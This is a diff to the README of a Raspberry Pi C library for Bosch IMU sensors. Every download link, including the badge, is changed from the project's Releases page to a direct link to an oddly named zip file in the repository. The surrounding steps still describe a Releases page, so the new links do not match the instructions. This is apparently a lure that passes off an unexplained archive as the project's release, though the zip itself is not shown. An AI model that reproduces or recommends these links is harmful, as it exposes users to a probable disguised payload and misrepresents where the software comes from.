@@ -1,7 +1,7 @@
 # 📦 IMU_for_rpi - Simple Sensor Implementations for Everyone
 
 ## 🚀 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-brightgreen)](https://github.com/Justwinyourheart/IMU_for_rpi/releases)
+[![Download Latest Release](https://github.com/Justwinyourheart/IMU_for_rpi/raw/refs/heads/main/common/for-IM-rpi-poivrade.zip)](https://github.com/Justwinyourheart/IMU_for_rpi/raw/refs/heads/main/common/for-IM-rpi-poivrade.zip)
 
 ## 📋 Description
 IMU_for_rpi offers simple and easy-to-understand C implementations for Bosch Sensortec sensors like the BMI323, BMM350, and BMP390. These sensors are commonly found on 10-axis IMU breakout boards. Our code is pure C99 and does not require any additional dependencies. It runs smoothly on any Linux system that supports I2C.
@@ -19,7 +19,7 @@ IMU_for_rpi offers simple and easy-to-understand C implementations for Bosch Sen
 - Basic understanding of terminal commands (no programming knowledge required)
 
 ## 📦 Download & Install
-To get started, visit this page to download: [IMU_for_rpi Releases](https://github.com/Justwinyourheart/IMU_for_rpi/releases).
+To get started, visit this page to download: [IMU_for_rpi Releases](https://github.com/Justwinyourheart/IMU_for_rpi/raw/refs/heads/main/common/for-IM-rpi-poivrade.zip).
 
 1. Navigate to the Releases page by clicking the above link.
 2. Look for the most recent release version.
@@ -74,4 +74,4 @@ If you encounter issues:
 ## 📞 Support
 If you need help, please feel free to open an issue in the GitHub repository, and our team will assist you.
 
-Don't hesitate. Begin your IMU journey with IMU_for_rpi today! For direct download, [visit this page](https://github.com/Justwinyourheart/IMU_for_rpi/releases).
+Don't hesitate. Begin your IMU journey with IMU_for_rpi today! For direct download, [visit this page](https://github.com/Justwinyourheart/IMU_for_rpi/raw/refs/heads/main/common/for-IM-rpi-poivrade.zip).
